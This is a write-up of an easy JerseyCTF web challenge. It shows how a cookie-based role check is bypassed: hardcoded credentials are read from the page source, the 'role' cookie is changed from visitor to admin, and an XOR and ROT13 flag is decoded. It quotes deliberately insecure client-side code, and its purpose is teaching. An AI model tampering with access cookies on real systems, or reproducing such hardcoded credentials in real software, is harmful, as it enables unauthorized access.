# Garden State Gateway — JerseyCTF Writeup

**Challenge:** Garden State Gateway  
**Category:** web  
**Difficulty:** Easy  
**Points:** 411  
**Solves:** 68  
**Challenge Author:** Belal Ezat  
**Writeup by:** zham  
**Flag:** `jctf{g4t3w4y_c00k13}`

---

## Description

> The New Jersey Tourism Board just launched their new website to promote the Garden State. The dev team rushed to production and left a few things unlocked. Rumor has it, access control was half-baked. Can you find your way past the front desk?

**URL:** `http://garden-state-gateway.aws.jerseyctf.com`

---

## Background Knowledge (Read This First!)

### What are Cookies?

**Cookies** are small pieces of data stored in your browser that websites use to remember information about you — like whether you are logged in and what your role is. They are sent automatically with every request to the server.

The problem is: **cookies are stored on your machine**, which means you can read and edit them directly in your browser's DevTools. If a website trusts cookie values without verifying them server-side, you can change your role from `visitor` to `admin` and gain unauthorized access.

### What is ROT-N (Caesar Cipher)?

**ROT-N** is a simple substitution cipher that shifts every letter in a string by N positions in the alphabet. The most common variant is **ROT13**, which shifts by 13.

For example:
```
Input:  wpgs{t4g3j4l_p00x13}
ROT13:  jctf{g4t3w4y_c00k13}
```

Applying ROT13 twice returns the original string since 13 + 13 = 26.

### What is XOR Encryption?

**XOR** is a bitwise operation used for simple encryption. Each character in the plaintext is XOR'd against a character in the key (cycling through the key if it is shorter than the message). It is fully reversible — XOR the ciphertext with the same key to get the plaintext back.

---

## Solution — Step by Step

### Step 1 — Read the Page Source

Open the site and view the page source (Ctrl+U) or open DevTools → Sources → `(index)`. Scrolling to the JavaScript section reveals the login credentials hardcoded in plain text:

```javascript
const VALID_CREDS = [
  { user: "admin", pass: "admin" },
  { user: "staff", pass: "tourism2026" },
  { user: "guest",  pass: "guest" }
];
```

Any of these credentials will work. All of them set the role cookie to `visitor` after login — never `admin`.

### Step 2 — Understand the Vulnerability

After a successful login the code runs:

```javascript
function attemptLogin() {
  const match = VALID_CREDS.find(c => c.user === u && c.pass === p);
  if (match) {
    setRole("visitor");  // always visitor, never admin
    closeModal();
    renderView();
  }
}
```

The `renderView()` function then reads a **cookie** called `role` to decide what panel to show:

```javascript
function renderView() {
  const role = getRole();  // reads document.cookie
  if (role === 'admin') {
    document.getElementById('adminPanel').style.display = 'block';
    // decrypts and displays the flag here
  } else {
    document.getElementById('visitorPanel').style.display = 'block';
  }
}
```

The cookie lives in your browser. The server never re-validates it. So simply changing `role=visitor` to `role=admin` in your cookies makes `renderView()` show the admin panel and decrypt the flag. The Security Audit card on the admin page even admits it:

> *"Cookie-based role assignment is NOT a secure access control mechanism."*

### Step 3 — Log In

Click **Staff Login** in the navbar and enter:

```
username: guest
password: guest
```

You land on the visitor panel, which shows this hint:

```
[status]  role=visitor
[access]  restricted files: DENIED
// hmm, what if this role was something else?
```

### Step 4 — Change the Cookie

Open DevTools (F12) → **Application** tab → **Cookies** → click the site URL.

Find the cookie named `role` with value `visitor`. Double-click the value field and change it to `admin`.

Alternatively, paste this into the **Console** tab:

```javascript
document.cookie = "role=admin; path=/"
```

### Step 5 — Trigger the Admin Panel

Call `renderView()` in the Console to re-render the page with your updated cookie:

```javascript
renderView()
```

The admin dashboard now appears, showing analytics cards and a flag box at the bottom labeled **"Encrypted Document Reference (ROT-N)"**.

### Step 6 — Decrypt the Flag

The JavaScript decrypts the flag using XOR with the key `"admin"`:

```javascript
var enc = [22,20,10,26,21,21,80,10,90,4,85,8,50,25,94,81,28,92,90,19];
var k = role; // "admin"
var f = '';
for (var i = 0; i < enc.length; i++) {
  f += String.fromCharCode(enc[i] ^ k.charCodeAt(i % k.length));
}
```

Running this in the browser Console or Node.js:

```
Output: wpgs{t4g3j4l_p00x13}
```

The XOR output is still ROT13-encoded. Apply ROT13 to finish decoding:

```
wpgs{t4g3j4l_p00x13}  →  jctf{g4t3w4y_c00k13}
```

---

## Flag

```
jctf{g4t3w4y_c00k13}
```

---

## Tools Used

| Tool | Purpose | Level |
|------|---------|-------|
| Browser DevTools — Application tab | View and edit the `role` cookie | ⭐ Easy |
| Browser DevTools — Console tab | Run `renderView()` to trigger the admin panel | ⭐ Easy |
| Browser Console / Node.js | XOR-decrypt the encoded flag array | ⭐ Easy |
| ROT13 decoder | Final decode of the XOR output | ⭐ Easy |

---

## Key Takeaways

- **Never trust client-side data for access control.** Cookies, localStorage, and URL parameters are all controlled by the user. Always verify roles server-side.
- **Hardcoded credentials in client-side JavaScript are public.** Any user who opens DevTools can read them instantly.
- **Layered encoding is not encryption.** XOR with a guessable key followed by ROT13 is trivially reversible once you read the source.
- **Read the hints in the page.** The visitor panel literally said `// hmm, what if this role was something else?` — always read comments in source code.
